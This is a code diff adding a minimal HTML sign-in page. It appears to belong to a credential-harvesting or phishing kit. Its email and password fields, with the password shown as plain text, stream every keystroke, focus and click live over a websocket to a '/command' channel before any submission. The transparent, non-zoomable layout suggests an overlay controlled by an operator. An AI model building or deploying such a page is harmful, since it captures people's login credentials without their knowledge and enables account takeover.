@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <script type="text/javascript" src="assets/js/jquery.min.js"></script>
+  <script type="text/javascript" src="assets/js/socket.io.js"></script>
+</head>
+<body style="overflow: hidden; background-color: rgba(0,0,0,0); margin: 50px" >
+  Email: <input type="text" name="email" onclick="changeInput(this)" onfocus="changeInput(this)" onkeyup="changeText(this)"><br>
+  Password: <input type="text" name="password" onclick="changeInput(this)" onfocus="changeInput(this)" onkeyup="changeText(this)"><br>
+  <button onclick="clickButton('submit')">Sign In</button>
+
+  
+  <script>
+      location.queryString = {};
+      location.search.substr(1).split("&").forEach(function (pair) {
+          if (pair === "") return;
+          var parts = pair.split("=");
+          location.queryString[parts[0]] = parts[1] &&
+              decodeURIComponent(parts[1].replace(/\+/g, " "));
+      });
+      var socket = io(location.protocol + '//' + location.host + '/command', {
+        transports: ['websocket']
+      });
+      socket.on('connect', () => {
+        console.log(socket.connected); // true
+      });
+
+      function changeInput(input){
+        socket.emit('changeInput', {
+          field: input.name,
+          value: input.value
+        });
+      }
+
+      function clickButton(button){
+        socket.emit('clickButton', {
+          field: button
+        });
+      }
+
+      function changeText(input){
+        socket.emit('changeText', {
+          field: input.name,
+          value: input.value
+        });
+      }
+    </script>
+</body>
+</html>
